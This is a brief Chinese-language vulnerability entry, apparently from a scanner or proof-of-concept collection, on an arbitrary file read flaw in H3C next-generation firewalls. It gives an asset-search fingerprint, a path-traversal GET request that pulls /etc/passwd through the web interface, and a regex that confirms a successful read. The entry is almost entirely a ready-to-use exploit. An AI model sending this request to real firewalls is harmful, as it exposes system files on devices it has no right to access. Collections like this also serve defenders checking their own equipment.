# H3C下一代防火墙任意文件读取漏洞

H3C ｜ 任意文件读取/写入 ｜ —
- **指纹**：`product=H3C-下一代防火墙`
- **请求**：`GET /webui/?file_name=../../../../../etc/passwd&g=sys_corefile_sysinfo_download HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$